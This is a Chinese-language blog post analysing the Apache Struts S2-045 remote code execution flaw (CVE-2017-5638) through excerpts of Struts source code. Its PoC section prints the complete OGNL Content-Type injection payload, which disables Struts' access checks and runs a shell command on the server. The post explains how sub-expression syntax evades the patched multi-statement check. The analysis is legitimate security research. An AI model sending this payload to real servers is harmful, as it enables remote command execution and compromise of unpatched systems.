---
layout: post
title: "也谈S2-045"
date: 2017-03-21 02:04:34 +0800
author: tang3
comments: true
categories: 技术
---

## 0x00 序

2017年3月7日Struts的S2-045漏洞掀起了一波热潮，刚好休年假出去玩，没有赶上这波，回来赶紧学习各位师傅的文章知识点。网上的分析文章基本上保持了只传PoC，漏洞分析抄官网漏洞描述的炒作风格，能找到的仅有下面这三篇有价值的漏洞分析文章。

seebug的[《S2-045 原理初步分析（CVE-2017-5638）》](http://paper.seebug.org/241/)和[《S2-045 漏洞分析》](http://paper.seebug.org/247/)通过对比版本差异分析出漏洞问题的形成，内容上基本大同小异，后一篇比前一篇详细一点。第二篇主要还是在findText、translateVariables这些工具方法上纠结个不停，与其说是漏洞分析，倒不如说是Ognl执行流程分析。其实如果你跟多一些Strut2的Ognl相关漏洞，就会养成对LocalizedTextUtil下方法警觉的习惯，也会对它们执行Ognl表达式的流程烂熟于胸。

还有隐形人真忙的[《s2-045漏洞分析》](http://blog.csdn.net/u011721501/article/details/60768657)，这才是一篇真正的漏洞分析，一看就是老司机，入口点直指要害，执行逻辑描述的简单直接毫不拖沓。不过应该是作者只是匆匆一瞥，分析的流程只是2.3.x系列的逻辑，2.5.x系列的漏洞与他所描述的稍有不同。

这篇文章我会针对2.5.x系列的漏洞执行流程进行描述，当做隐形人真忙的补充篇。在这之后我会简单分析下这次流出的PoC为什么可以绕过Struts的检查，成功的执行表达式。

## 0x01 漏洞分析（2.5.x系列版本篇）

形成漏洞的主要原因是处理POST提交multipart/form-data类型的请求过于草率的将带有用户可控内容的错误信息交由Ognl表达式处理，从而造成Ognl表达式代码执行。我们直接来看request请求的解包代码：

```java
    public HttpServletRequest wrapRequest(HttpServletRequest request) throws IOException {
        // don't wrap more than once
        if (request instanceof StrutsRequestWrapper) {
            return request;
        }

        String content_type = request.getContentType();
        if (content_type != null && content_type.contains("multipart/form-data")) {
            MultiPartRequest mpr = getMultiPartRequest();
            LocaleProvider provider = getContainer().getInstance(LocaleProvider.class);
            request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);
        } else {
            request = new StrutsRequestWrapper(request, disableRequestAttributeValueStackLookup);
        }

        return request;
    }

```

判断content_type字段中有没有multipart/form-data字样，有的话就进入了解析逻辑，后面的MultiPartRequestWrapper会通过JakartaMultiPartRequest的parse方法解析multi-part相关的数据（也包含content_type字段中的内容）。如果解析过程中出现问题（比如不符合协议规范）会触发catch流程，向MultiPartRequestWrapper对象插入异常信息。这个地方就是和隐形人真忙分析的2.3.x系列不同的地方，在2.3系列中这里就通过JakartaMultiPartRequest的buildErrorMessage方法直接调用了LocalizedTextUtil的findText方法执行了Ongl。而在2.5.x系列中，buildErrorMessage方法只是构建错误信息字符串，然后插到MultiPartRequestWrapper对象中，猜测应该是官方觉得文件上传部分的错误信息应该统一放到FileUploadInterceptor中处理，避免不同的解析插件错误信息返回不一致。以下为JakartaMultiPartRequest的parse方法代码：

```java
public void parse(HttpServletRequest request, String saveDir) throws IOException {
        try {
            setLocale(request);
            processUpload(request, saveDir);
        } catch (FileUploadException e) {
            LOG.warn("Request exceeded size limit!", e);
            LocalizedMessage errorMessage;
            if(e instanceof FileUploadBase.SizeLimitExceededException) {
                FileUploadBase.SizeLimitExceededException ex = (FileUploadBase.SizeLimitExceededException) e;
                errorMessage = buildErrorMessage(e, new Object[]{ex.getPermittedSize(), ex.getActualSize()});
            } else {
                errorMessage = buildErrorMessage(e, new Object[]{});
            }

            if (!errors.contains(errorMessage)) {
                errors.add(errorMessage);
            }
        } catch (Exception e) {
            LOG.warn("Unable to parse request", e);
            LocalizedMessage errorMessage = buildErrorMessage(e, new Object[]{});
            if (!errors.contains(errorMessage)) {
                errors.add(errorMessage);
            }
        }
    }
```

再向后走到FileUploadInterceptor中我们就可以发现如下代码：

```java
 MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper) request;

        if (multiWrapper.hasErrors()) {
            for (LocalizedMessage error : multiWrapper.getErrors()) {
                if (validation != null) {
                    validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));
                }
            }
```

这里就是将MultiPartRequestWrapper对象request中的所有error信息遍历出来添加到validation变量中，而添加的过程中就用到了LocalizedTextUtil的findText方法，其中第4个参数会到达我们熟悉的TextParseUtil的translateVariables方法，即作为Ognl表达式执行。

## 0x02 PoC分析

各大网站关于S2-045都贴出了带有下面PoC的利用代码：

```
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

这段利用代码我第一看到时感觉很不解，为什么这样就可以绕过Struts的Ognl表达式执行校验了？因为在Struts官方修复S2-037这个漏洞时已经限制了OgnlUtil类中的getvalue方法（translateVariables的底层也是getvalue），使其无法继续执行多语句的Ognl表达式了。

![compare](/assets/images/2017-03/compare.png)

我们对比来看getvalue执行ognl的必经之路compileAndExecute方法：


```java
private <T> Object compileAndExecute(String expression, Map<String, Object> context, OgnlTask<T> task) throws OgnlException {
        Object tree;
        if (enableExpressionCache) {
            tree = expressions.get(expression);
            if (tree == null) {
                tree = Ognl.parseExpression(expression);
                checkEnableEvalExpression(tree, context);
            }
        } else {
            tree = Ognl.parseExpression(expression);
            checkEnableEvalExpression(tree, context);
        }

```

首先通过expressions.get(expression)来尝试解析表达式，如果表达式只是单条语句，那么tree变量就必然非空，否则tree变量为空需要经过checkEnableEvalExpression方法检验。通过上面compare的图，可以看出这个流程多了一个isSequence方法，这个方法判断OnglContext中的语句是否为队列（多条语句），如果是那么返回false。也就是说，如果经过OgnlUtil类getvalue方法的ognl表达式是多语句形式的，那么一定会拒绝执行。

而网上流传的这段PoC对防护有着惊艳的表现，它通过使用Ognl提供的子表达式的语法，将多条语句合成了一条语句，完美bypass掉了if(tree == null)中的校验。

![subexpression](/assets/images/2017-03/subexpression.png)

## 0x03 总结

关于FileUploadInterceptor我也多次有跟踪，想从其中找到利用点，不过却忽略了JakartaMultiPartRequest中的调试，与一个历史级的漏洞失之交臂，惋惜至极。漏洞的挖掘就是需要一个死角也不放过的较真，否则也就像我这样空叹曾经路过。。。

安恒的小哥能发现这个漏洞也是必然，毕竟他对于Struts的每个更新版本和细节都会认真研究（就像S2-032这个原先没有漏洞，后来版本更新导致的漏洞），我这样的懒人在他面前实在是汗颜。哦，对了，还有他的这个PoC实现思路实在是让我叹为观止，我是服了~~

## 0x04 参考文章

【1】[s2-045漏洞分析（隐形人真忙）](http://blog.csdn.net/u011721501/article/details/60768657)

【2】[S2-045 漏洞分析](http://paper.seebug.org/247/)

【3】[《S2-045 原理初步分析（CVE-2017-5638）》](http://paper.seebug.org/241/)

【4】[OGNL语法表](https://commons.apache.org/proper/commons-ognl/language-guide.html)

【4】[Struts2.3.28与2.3.28.1的代码对比](https://github.com/apache/struts/commit/c48007cccc4a8007005eec782902c1f38e683438#diff-72e88cf125a077f6fb215a2e4cf3eb40L295)